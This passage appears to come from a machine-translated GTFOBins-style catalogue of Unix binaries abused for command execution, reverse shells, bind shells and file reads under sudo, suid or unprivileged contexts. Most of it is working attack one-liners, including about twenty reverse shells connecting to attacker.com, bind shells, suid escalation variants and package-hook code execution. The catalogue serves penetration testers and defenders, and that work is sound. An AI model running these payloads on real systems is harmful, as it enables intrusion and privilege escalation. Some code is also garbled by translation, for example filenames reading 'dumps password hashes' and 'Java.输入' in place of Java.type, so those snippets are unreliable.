cat nohup.out
```

### `opencode`

```bash
opencode
! /path/to/command
```

### `openvt`

> **注意**: The command execution is displayed on the virtual console.
```bash
openvt -- /path/to/command
```

### `php`

**方法 1:**

```bash
php -r 'echo shell_exec("/path/to/command");'
```

**方法 2:**

```bash
php -r '$r=array(); exec("/path/to/command", $r); print(join("\n",$r));'
```

**方法 3:**

```bash
php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("/path/to/command", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
```

### `pkg`

> **注意**: 使用 FreeBSD package with [fpm](https://github.com/jordansissel/fpm) 生成并上传到目标。

```
echo /path/to/command >x.sh
fpm -n x -s dir -t freebsd -a all --before-install x.sh .
```
```bash
pkg install -y --no-repo-update ./x-1.0.txz
```

### `procmail`

> **注意**: 程序对文件所有权很挑剔，并等待一些输入。
```bash
echo -e ':0\n| /path/to/command >/path/to/temp-file
procmail -m /path/to/temp-file
```

### `restic`

**方法 1:**

```bash
RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup
```

**方法 2:**

```bash
restic --password-command='/path/to/command' backup
```

### `rpm`

> **注意**: 使用 RPM package with [fpm](https://github.com/jordansissel/fpm) 生成并上传到目标。

```
echo /path/to/command >x.sh
fpm -n x -s dir -t rpm -a all --before-install x.sh .
```
```bash
rpm -ivh x-1.0-1.noarch.rpm
```

### `rsyslogd`

> **注意**: 为了使此方法生效，必须能够触发一个包含所选字符串的事件，例如 `somerandomstring`. 一种可能性是尝试通过 SSH 连接到受害者主机，例如：

```
ssh somerandomstring@victim.com
```
```bash
cat >/path/to/temp-file <<EOF
module(load="imuxsock")
:msg, contains, "somerandomstring" ^/path/to/command
EOF

rsyslogd -f /path/to/temp-file
```

### `rustup`

```bash
mkdir /path/to/temp-dir/bin/
mkdir /path/to/temp-dir/lib/
echo '/path/to/command' >/path/to/temp-dir/bin/rustc
chmod +x /path/to/temp-dir/bin/rustc
rustup toolchain link x /path/to/temp-dir/
rustup run x rustc
```

### `snap`

> **注意**: 使用 Snap package with [fpm](https://github.com/jordansissel/fpm) 生成并上传到目标。

```
mkdir -p meta/hooks
echo -e '#!/bin/sh\n/path/to/command; false' >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```
```bash
snap install xxxx_1.0_all.snap --dangerous --devmode
```

### `sshfs`

```bash
sshfs -o ssh_command=/path/to/command x: /path/to/dir/
```

### `sysctl`

> **注意**: The command is executed by `root` in the background when a core dump occurs.

To trigger a core dump, send the `SIGQUIT` signal to a process, for example:

```
sleep infinity &
kill -QUIT $!
```
```bash
sysctl 'kernel.core_pattern=|/path/to/command'
```

### `systemd-run`

```bash
systemd-run /path/to/command
```

### `tcpdump`

**方法 1:**

> **注意**: 这要求实际捕获一些流量。另请注意子进程会立即被发送到后台。
```bash
echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file
```
**sudo** variant:
```bash
echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file -Z root
```

**方法 2:**

> **注意**: 这要求实际捕获一些流量。另请注意 `command-argument` 字符串既传递给命令又作为文件写入，因此有一些限制。
```bash
tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /path/to/command
```

### `virsh`

```bash
cat >/path/to/temp-文件转储密码哈希。xml <<EOF
<domain 输入='kvm'>
  <name>x</name>
  <os>
    <输入 arch='x86_64'>hvm</输入>
  </os>
  <memory unit='KiB'>1</memory>
  <devices>
    <interface 输入='ethernet'>
      <script path='/path/to/command'/>
    </interface>
  </devices>
</domain>
EOF
virsh -c qemu:///system create /path/to/temp-文件转储密码哈希。xml
virsh -c qemu:///system destroy x
```

### `yum`

> **注意**: 使用 RPM package with [fpm](https://github.com/jordansissel/fpm) 生成并上传到目标。

```
echo /path/to/command >x.sh
fpm -n x -s dir -t rpm -a all --before-install .x.sh .
```
```bash
yum localinstall -y x-1.0-1.noarch.rpm
```

### `zic`

> **注意**: This executes the command 两次:

- `/path/to/command 0 xxx`
- `/path/to/command 1 xxx`

Additionally the `Test` file is created.
```bash
echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file
echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file
```

---

## Reverse shell (reverse-shell)

> 该可执行文件可以向监听中的攻击者发送反向 Shell。

共 **21** 个工具支持此功能。

| # | 工具名 | 示例数 | 权限上下文 |
|---|--------|--------|-----------|
| 1 | `bash` | 1 | sudo, suid, unprivileged |
| 2 | `busybox` | 1 | sudo, unprivileged |
| 3 | `code` | 1 | sudo, unprivileged |
| 4 | `gawk` | 1 | sudo, suid, unprivileged |
| 5 | `go` | 1 | sudo, unprivileged |
| 6 | `jjs` | 1 | sudo, unprivileged |
| 7 | `jrunscript` | 1 | sudo, unprivileged |
| 8 | `julia` | 1 | sudo, suid, unprivileged |
| 9 | `lua` | 1 | sudo, suid, unprivileged |
| 10 | `nc` | 1 | sudo, suid, unprivileged |
| 11 | `node` | 1 | sudo, suid, unprivileged |
| 12 | `openssl` | 1 | sudo, suid, unprivileged |
| 13 | `perl` | 1 | sudo, unprivileged |
| 14 | `php` | 1 | sudo, suid, unprivileged |
| 15 | `python` | 1 | sudo, suid, unprivileged |
| 16 | `ruby` | 1 | sudo, unprivileged |
| 17 | `socat` | 1 | sudo, suid, unprivileged |
| 18 | `socket` | 1 | sudo, suid, unprivileged |
| 19 | `tclsh` | 1 | sudo, suid, unprivileged |
| 20 | `telnet` | 1 | sudo, suid, unprivileged |
| 21 | `zsh` | 1 | sudo, suid, unprivileged |

### `bash`

```bash
bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'
```
**suid** variant:
```bash
bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1'
```
**listener**: `tcp-server`

### `busybox`

> BusyBox 可能包含许多工具，运行 `busybox --list-full` 检查支持哪些其他二进制文件。

```bash
busybox nc -e /bin/sh attacker.com 12345
```
**listener**: `tcp-server`

### `code`

> **注意**: 这需要一个有效的 GitHub 账户。

Run the command locally, 然后 on the attacker box navigate to <https://github.com/login/device>, ，使用提供的代码授权隧道。
```bash
code tunnel --name xxxxxx
```
**listener** (导航到 <https://vscode.dev/tunnel/xxxxxx> ，在那里可以使用远程 VS Code 实例在受害者机器上生成系统 Shell。

从菜单中选择 "View" -> "Terminal".):

### `gawk`

```bash
gawk 'BEGIN {
    s = "/inet/tcp/0/attacker.com/12345";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```
**listener**: `tcp-server`

### `go`

```bash
echo -e 'package main\nimport (\n\t"os"\n\t"net"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\tip := net.ParseIP("attacker.com").To4()\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], ip)\n\tsyscall.Connect(fd, addr)\n\tsyscall.Dup2(fd, 0)\n\tsyscall.Dup2(fd, 1)\n\tsyscall.Dup2(fd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >/path/to/temp-文件转储密码哈希。go
go run /path/to/temp-文件转储密码哈希。go
```
**listener**: `tcp-server`

### `jjs`

> 此工具从 Java SE 8 开始安装。

```bash
jjs
var host='attacker.com';
var port=12345;
var ProcessBuilder = Java.输入('java.lang.ProcessBuilder');
var p=new ProcessBuilder('/bin/sh', '-i').redirectErrorStream(true).start();
var Socket = Java.输入('java.net.Socket');
var s=new Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.输入('java.lang.Thread').sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();
```
**listener**: `tcp-server`

### `jrunscript`

> 此工具从 Java SE 6 开始安装。

```bash
jrunscript -e 'var host="attacker.com";
    var port=12345;
    var p=new java.lang.ProcessBuilder("/bin/sh", "-i").redirectErrorStream(true).start();
    var s=new java.net.Socket(host,port);
    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    java.lang.Thread.sleep(50);
    try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
```
**listener**: `tcp-server`

### `julia`

```bash
julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
```
**listener**: `tcp-server`

### `lua`

> **注意**: This requires `lua-socket` 可用。
```bash
lua -e '
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("attacker.com",12345);
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
```
**listener**: `tcp-server`

### `nc`

> **注意**: 这仅适用于传统 netcat。
```bash
nc -e /bin/sh attacker.com 12345
```
**listener**: `tcp-server`

### `node`

```bash
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").connect(12345, "attacker.com", function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'
```
**suid** variant:
```bash
node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
require("net").connect(12345, "attacker.com", function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'
```
**listener**: `tcp-server`

### `openssl`

> **注意**: Shell 进程不是由 `openssl`.
```bash
mkfifo /path/to/temp-socket
/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket
```
**listener**: `tls-server`

### `perl`

```bash
perl -e 'use Socket;$i="attacker.com";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
**listener**: `tcp-server`

### `php`

```bash
php -r '$sock=fsockopen("attacker.com",12345);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
```
**listener**: `tcp-server`

### `python`

> 这些载荷兼容 Python 2 和 3 版本。

```bash
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect(("attacker.com",12345))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'
```
**listener** (A TCP server with TTY support can be used on the attacker box 接收 Shell。):
```bash
socat file:/dev/tty,raw,echo=0 tcp-listen:12345
```

### `ruby`

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
**listener**: `tcp-server`

### `socat`

```bash
socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
```
**suid** variant:
```bash
socat tcp-connect:attacker.com:12345 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。
**listener**: `tcp-server-tty`

### `socket`

```bash
socket -qvp '/bin/sh -i' attacker.com 12345
```
**listener**: `tcp-server`

### `tclsh`

```bash
tclsh
set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;
```
**listener**: `tcp-server`

### `telnet`

> **注意**: Shell 进程不是由 `openssl`.
```bash
mkfifo /path/to/temp-socket
telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket
```

### `zsh`

```bash
zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```
**listener**: `tcp-server`

---

## Bind shell (bind-shell)

> 该可执行文件可以将系统 Shell 绑定到本地端口，等待攻击者连接。

共 **7** 个工具支持此功能。

| # | 工具名 | 示例数 | 权限上下文 |
|---|--------|--------|-----------|
| 1 | `gawk` | 1 | sudo, suid, unprivileged |
| 2 | `go` | 1 | sudo, unprivileged |
| 3 | `lua` | 1 | sudo, suid, unprivileged |
| 4 | `nc` | 1 | sudo, suid, unprivileged |
| 5 | `node` | 1 | sudo, suid, unprivileged |
| 6 | `socat` | 1 | sudo, suid, unprivileged |
| 7 | `socket` | 1 | sudo, suid, unprivileged |

### `gawk`

```bash
gawk 'BEGIN {
    s = "/inet/tcp/12345/0/0";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```
**connector**: `tcp-client`

### `go`

```bash
echo -e 'package main\nimport (\n\t"os"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], []byte{0,0,0,0})\n\tsyscall.Bind(fd, addr)\n\tsyscall.Listen(fd, 1)\n\tnfd, _, _ := syscall.Accept(fd)\n\tsyscall.Dup2(nfd, 0)\n\tsyscall.Dup2(nfd, 1)\n\tsyscall.Dup2(nfd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >/path/to/temp-文件转储密码哈希。go
go run /path/to/temp-文件转储密码哈希。go
```
**connector**: `tcp-client`

### `lua`

> **注意**: This requires `lua-socket` 可用。
```bash
lua -e '
  local k=require("socket");
  local s=assert(k.bind("*",12345));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
```
**connector**: `tcp-client`

### `nc`

> **注意**: 这仅适用于传统 netcat。
```bash
nc -l -p 12345 -e /bin/sh
```
**connector**: `tcp-client`

### `node`

```bash
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen(12345)'
```
**suid** variant:
```bash
node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
require("net").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen(12345)'
```
**connector**: `tcp-client`

### `socat`

```bash
socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane
```
**suid** variant:
```bash
socat tcp-listen:12345,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。
**connector**: `tcp-client-tty`

### `socket`

```bash
socket -svp '/bin/sh -i' 12345
```
**connector**: `tcp-client`

---

## File read (file-read)

> 该可执行文件可以从本地文件读取数据。

共 **199** 个工具支持此功能。

| # | 工具名 | 示例数 | 权限上下文 |
|---|--------|--------|-----------|
| 1 | `7z` | 1 | sudo, unprivileged |
| 2 | `alpine` | 1 | sudo, suid, unprivileged |
| 3 | `apache2` | 2 | sudo, suid, unprivileged |
| 4 | `apache2ctl` | 1 | sudo, unprivileged |
| 5 | `ar` | 1 | sudo, suid, unprivileged |
| 6 | `aria2c` | 1 | sudo, suid, unprivileged |
| 7 | `arj` | 1 | sudo, suid, unprivileged |
| 8 | `arp` | 1 | sudo, suid, unprivileged |
| 9 | `as` | 1 | sudo, suid, unprivileged |
| 10 | `ascii-xfr` | 1 | sudo, suid, unprivileged |
| 11 | `ascii85` | 1 | sudo, unprivileged |
| 12 | `aspell` | 2 | sudo, suid, unprivileged |
| 13 | `atobm` | 1 | sudo, suid, unprivileged |
| 14 | `aws` | 1 | sudo, suid, unprivileged |
| 15 | `base32` | 1 | sudo, suid, unprivileged |
| 16 | `base58` | 1 | sudo, unprivileged |
| 17 | `base64` | 1 | sudo, suid, unprivileged |
| 18 | `basenc` | 1 | sudo, suid, unprivileged |
| 19 | `basez` | 1 | sudo, suid, unprivileged |
| 20 | `bash` | 2 | sudo, suid, unprivileged |
| 21 | `bbot` | 1 | sudo, unprivileged |
| 22 | `bc` | 1 | sudo, suid, unprivileged |
| 23 | `bconsole` | 1 | sudo, suid, unprivileged |
| 24 | `bridge` | 1 | sudo, suid, unprivileged |
| 25 | `bzip2` | 1 | sudo, suid, unprivileged |
| 26 | `cat` | 1 | sudo, suid, unprivileged |
| 27 | `check_cups` | 1 | sudo, unprivileged |
| 28 | `check_log` | 1 | sudo, unprivileged |
| 29 | `check_memory` | 1 | sudo, unprivileged |
| 30 | `check_raid` | 1 | sudo, unprivileged |
| 31 | `check_statusfile` | 1 | sudo, unprivileged |
| 32 | `clamscan` | 1 | sudo, suid, unprivileged |
| 33 | `cmake` | 1 | sudo, unprivileged |
| 34 | `cmp` | 1 | sudo, suid, unprivileged |
| 35 | `column` | 1 | sudo, suid, unprivileged |
| 36 | `comm` | 1 | sudo, suid, unprivileged |
| 37 | `cp` | 1 | sudo, suid, unprivileged |
| 38 | `cpio` | 2 | sudo, suid, unprivileged |
| 39 | `csplit` | 1 | sudo, suid, unprivileged |
| 40 | `csvtool` | 1 | sudo, suid, unprivileged |
| 41 | `cupsfilter` | 1 | sudo, suid, unprivileged |
| 42 | `curl` | 1 | sudo, suid, unprivileged |
| 43 | `cut` | 1 | sudo, suid, unprivileged |
| 44 | `date` | 1 | sudo, suid, unprivileged |
| 45 | `dd` | 1 | sudo, suid, unprivileged |
| 46 | `dialog` | 1 | sudo, suid, unprivileged |
| 47 | `diff` | 2 | sudo, suid, unprivileged |
| 48 | `dig` | 1 | sudo, suid, unprivileged |
| 49 | `dmesg` | 1 | sudo, suid, unprivileged |
| 50 | `docker` | 1 | sudo, suid, unprivileged |
| 51 | `dos2unix` | 1 | sudo, suid, unprivileged |
| 52 | `dosbox` | 2 | sudo, suid, unprivileged |
| 53 | `dotnet` | 1 | sudo, unprivileged |
| 54 | `ed` | 1 | sudo, suid, unprivileged |
| 55 | `efax` | 1 | sudo, suid |
| 56 | `egrep` | 1 | sudo, suid, unprivileged |
| 57 | `elvish` | 1 | sudo, suid, unprivileged |
| 58 | `emacs` | 1 | sudo, unprivileged |
| 59 | `eqn` | 1 | sudo, suid, unprivileged |
| 60 | `espeak` | 1 | sudo, suid, unprivileged |
| 61 | `exiftool` | 1 | sudo, unprivileged |
| 62 | `expand` | 1 | sudo, suid, unprivileged |
| 63 | `expect` | 1 | sudo, suid, unprivileged |
| 64 | `fastfetch` | 1 | sudo, suid, unprivileged |
| 65 | `fgrep` | 1 | sudo, suid, unprivileged |
| 66 | `file` | 2 | sudo, suid, unprivileged |
| 67 | `find` | 1 | sudo, suid, unprivileged |
| 68 | `fmt` | 2 | sudo, suid, unprivileged |
| 69 | `fold` | 1 | sudo, suid, unprivileged |
| 70 | `fping` | 1 | sudo, suid, unprivileged |
| 71 | `gawk` | 1 | sudo, suid, unprivileged |
| 72 | `gcc` | 2 | sudo, unprivileged |
| 73 | `gcore` | 1 | sudo, suid, unprivileged |
| 74 | `genisoimage` | 2 | sudo, suid, unprivileged |
| 75 | `git` | 1 | sudo, suid, unprivileged |
| 76 | `go` | 1 | sudo, unprivileged |
| 77 | `grep` | 1 | sudo, suid, unprivileged |
| 78 | `gzip` | 1 | capabilities, sudo, suid, unprivileged |
| 79 | `head` | 1 | sudo, suid, unprivileged |
| 80 | `hexdump` | 1 | sudo, suid, unprivileged |
| 81 | `highlight` | 1 | sudo, suid, unprivileged |
| 82 | `iconv` | 1 | sudo, suid, unprivileged |
| 83 | `ip` | 1 | sudo, suid, unprivileged |
| 84 | `jjs` | 1 | sudo, unprivileged |
| 85 | `join` | 1 | sudo, suid, unprivileged |
| 86 | `jq` | 1 | sudo, suid, unprivileged |
| 87 | `jrunscript` | 1 | sudo, unprivileged |
| 88 | `jshell` | 1 | sudo, unprivileged |
| 89 | `julia` | 1 | sudo, suid, unprivileged |
| 90 | `ksshell` | 1 | sudo, suid, unprivileged |
| 91 | `last` | 1 | sudo, suid, unprivileged |
| 92 | `latex` | 1 | sudo, suid, unprivileged |
| 93 | `latexmk` | 1 | sudo, unprivileged |
| 94 | `less` | 3 | sudo, suid, unprivileged |
| 95 | `links` | 1 | sudo, suid, unprivileged |
| 96 | `logrotate` | 1 | sudo, suid, unprivileged |
| 97 | `look` | 1 | sudo, suid, unprivileged |
| 98 | `ltrace` | 1 | sudo, suid, unprivileged |
| 99 | `lua` | 1 | sudo, suid, unprivileged |
| 100 | `lwp-download` | 1 | sudo, unprivileged |
| 101 | `lwp-request` | 1 | sudo, unprivileged |
| 102 | `m4` | 1 | sudo, suid, unprivileged |
| 103 | `make` | 1 | sudo, suid, unprivileged |
| 104 | `man` | 1 | sudo, suid, unprivileged |
| 105 | `mawk` | 1 | sudo, suid, unprivileged |
| 106 | `more` | 1 | sudo, suid, unprivileged |
| 107 | `mosquitto` | 1 | sudo, suid, unprivileged |
| 108 | `msgattrib` | 1 | sudo, suid, unprivileged |
| 109 | `msgcat` | 1 | sudo, suid, unprivileged |
| 110 | `msgconv` | 1 | sudo, suid, unprivileged |
| 111 | `msgfilter` | 1 | sudo, suid, unprivileged |
| 112 | `msgmerge` | 1 | sudo, suid, unprivileged |
| 113 | `msguniq` | 1 | sudo, suid, unprivileged |
| 114 | `mtr` | 1 | sudo, unprivileged |
| 115 | `mutt` | 1 | sudo, unprivileged |
| 116 | `mypy` | 1 | sudo, unprivileged |
| 117 | `nano` | 1 | sudo, suid, unprivileged |
| 118 | `nasm` | 1 | sudo, suid, unprivileged |
| 119 | `neofetch` | 1 | sudo, unprivileged |
| 120 | `nft` | 1 | sudo, unprivileged |
| 121 | `nl` | 1 | sudo, suid, unprivileged |
| 122 | `nm` | 1 | sudo, suid, unprivileged |
| 123 | `nmap` | 1 | sudo, suid, unprivileged |
| 124 | `node` | 1 | sudo, suid, unprivileged |
| 125 | `nroff` | 1 | sudo, unprivileged |
| 126 | `ntpdate` | 1 | sudo, suid, unprivileged |
| 127 | `octave` | 1 | sudo, suid, unprivileged |
| 128 | `od` | 1 | sudo, suid, unprivileged |
| 129 | `openssl` | 1 | sudo, suid, unprivileged |
| 130 | `openvpn` | 1 | sudo, suid, unprivileged |
| 131 | `pandoc` | 1 | sudo, suid, unprivileged |
| 132 | `paste` | 1 | sudo, suid, unprivileged |
| 133 | `pax` | 1 | sudo, suid, unprivileged |
| 134 | `pdflatex` | 1 | sudo, suid, unprivileged |
| 135 | `perl` | 1 | sudo, suid, unprivileged |
| 136 | `pg` | 1 | sudo, suid, unprivileged |
| 137 | `php` | 1 | sudo, suid, unprivileged |
| 138 | `pic` | 1 | sudo, suid, unprivileged |
| 139 | `pr` | 1 | sudo, suid, unprivileged |
| 140 | `ptx` | 1 | sudo, suid, unprivileged |
| 141 | `puppet` | 1 | sudo, unprivileged |
| 142 | `pygmentize` | 1 | sudo, unprivileged |
| 143 | `pyright` | 3 | sudo, unprivileged |
| 144 | `python` | 1 | sudo, suid, unprivileged |
| 145 | `qpdf` | 1 | sudo, suid, unprivileged |
| 146 | `rake` | 1 | sudo, unprivileged |
| 147 | `readelf` | 1 | sudo, suid, unprivileged |
| 148 | `redcarpet` | 1 | sudo, unprivileged |
| 149 | `rev` | 1 | sudo, suid, unprivileged |
| 150 | `ruby` | 1 | sudo, unprivileged |
| 151 | `rustc` | 1 | sudo, unprivileged |
| 152 | `rustdoc` | 1 | sudo, unprivileged |
| 153 | `rustfmt` | 1 | sudo, unprivileged |
| 154 | `sed` | 1 | sudo, suid, unprivileged |
| 155 | `shuf` | 1 | sudo, suid, unprivileged |
| 156 | `socat` | 1 | sudo, suid, unprivileged |
| 157 | `soelim` | 1 | sudo, suid, unprivileged |
| 158 | `sort` | 1 | sudo, suid, unprivileged |
| 159 | `split` | 1 | sudo, suid, unprivileged |
| 160 | `sqlite3` | 1 | sudo, suid, unprivileged |
| 161 | `ss` | 1 | sudo, suid, unprivileged |
| 162 | `ssh` | 1 | sudo, suid, unprivileged |
| 163 | `ssh-copy-id` | 1 | sudo, unprivileged |
| 164 | `ssh-keyscan` | 1 | sudo, suid, unprivileged |
| 165 | `strings` | 1 | sudo, suid, unprivileged |
| 166 | `sysctl` | 1 | sudo, suid, unprivileged |
| 167 | `tac` | 1 | sudo, suid, unprivileged |
| 168 | `tail` | 1 | sudo, suid, unprivileged |
| 169 | `tar` | 1 | sudo, suid, unprivileged |
| 170 | `tbl` | 1 | sudo, suid, unprivileged |
| 171 | `terraform` | 1 | sudo, suid, unprivileged |
| 172 | `tic` | 1 | sudo, suid, unprivileged |
| 173 | `tmux` | 1 | sudo, suid, unprivileged |
| 174 | `troff` | 1 | sudo, suid, unprivileged |
| 175 | `tsc` | 1 | sudo, unprivileged |
| 176 | `ul` | 1 | sudo, suid, unprivileged |
| 177 | `unexpand` | 1 | sudo, suid, unprivileged |
| 178 | `uniq` | 1 | sudo, suid, unprivileged |
| 179 | `urlget` | 1 | sudo, suid, unprivileged |
| 180 | `uuencode` | 1 | sudo, suid, unprivileged |
| 181 | `vi` | 1 | sudo, suid, unprivileged |
| 182 | `vim` | 1 | sudo, suid, unprivileged |
| 183 | `w3m` | 1 | sudo, suid, unprivileged |
| 184 | `wall` | 1 | sudo |
| 185 | `wc` | 1 | sudo, suid, unprivileged |
| 186 | `wget` | 1 | sudo, suid, unprivileged |
| 187 | `whiptail` | 1 | sudo, suid, unprivileged |
| 188 | `xargs` | 1 | sudo, suid, unprivileged |
| 189 | `xmodmap` | 1 | sudo, suid, unprivileged |
| 190 | `xmore` | 1 | sudo, suid, unprivileged |
| 191 | `xpad` | 1 | sudo, suid, unprivileged |
| 192 | `xxd` | 1 | sudo, suid, unprivileged |
| 193 | `xz` | 1 | sudo, suid, unprivileged |
| 194 | `yelp` | 1 | sudo, unprivileged |
| 195 | `zcat` | 1 | sudo, unprivileged |
| 196 | `zgrep` | 1 | sudo, unprivileged |
| 197 | `zip` | 1 | sudo, suid, unprivileged |
| 198 | `zsh` | 2 | sudo, suid, unprivileged |
| 199 | `zsoelim` | 1 | sudo, suid, unprivileged |

### `7z`

```bash
7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so
```

### `alpine`

> **注意**: 文件在终端界面中显示。可能有其他选项可用，例如按 `S` 可以将文件内容保存到其他地方。
```bash
alpine -F /path/to/input-file
```

### `apache2`

**方法 1:**

> **注意**: 第一行可能会作为错误消息泄露。
> ⚠️ 二进制数据可能会被损坏。
```bash
apache2 -f /path/to/input-file
```

**方法 2:**

> **注意**: 第一行可能会作为错误消息泄露。
> ⚠️ 二进制数据可能会被损坏。
```bash
apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /path/to/input-file'
```

### `apache2ctl`

> **注意**: 只有第一行可能会作为错误消息泄露。
> ⚠️ 二进制数据可能会被损坏。
```bash
apache2ctl -c 'Include /path/to/input-file'
```

### `ar`

```bash
ar r /path/to/output-file /path/to/input-file
ar p /path/to/output-file
```

### `aria2c`

> **注意**: 文件作为错误消息泄露。
> ⚠️ 二进制数据可能会被损坏。
```bash
aria2c -i /path/to/input-file
```

### `arj`

> **注意**: The `.arj` 后缀将被添加到 `output-file`.
> ⚠️ 二进制数据可能会被损坏。
```bash
arj a /path/to/output-file /path/to/input-file
arj p /path/to/output-file
```

### `arp`

> **注意**: 行可能会作为错误消息泄露。
> ⚠️ 二进制数据可能会被损坏。
```bash
arp -v -f /path/to/input-file
```

### `as`

> **注意**: 行可能会作为错误消息泄露。
```bash
as @/path/to/input-file
```

### `ascii-xfr`

```bash
ascii-xfr -ns /path/to/input-file
```

### `ascii85`

```bash
ascii85 /path/to/input-file | ascii85 --decode
```

### `aspell`

**方法 1:**

> **注意**: The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words.
> ⚠️ 二进制数据可能会被损坏。
```bash
aspell -c /path/to/input-file
```

**方法 2:**

> **注意**: The first word is likely displayed as error messaged, and converted to lowercase.
> ⚠️ 二进制数据可能会被损坏。
```bash
aspell --conf /path/to/input-file
```

### `atobm`

> **注意**: 仅将文件的第一行输出到标准错误，不包含 `-` and `#` 字符，可以使用 `-c` 选项自定义，默认是 `-c -#`. 可以使用 `awk -F "'" '{printf "%s", $2}'`.
```bash
atobm /path/to/input-file
```

### `aws`

> ⚠️ 二进制数据可能会被损坏。
```bash
aws ec2 describe-instances --filter file:///path/to/input-file
```

### `base32`

```bash
base32 /path/to/input-file | base32 --decode
```

### `base58`

```bash
base58 /path/to/input-file | base58 --decode
```

### `base64`

```bash
base64 /path/to/input-file | base64 --decode
```

### `basenc`

```bash
basenc --base64 /path/to/input-file | basenc -d --base64
```

### `basez`

```bash
basez /path/to/input-file | basez --decode
```

### `bash`

**方法 1:**

> ⚠️ 二进制数据可能会被损坏。
```bash
bash -c 'echo "$(</path/to/input-file)"'
```
**suid** variant:
```bash
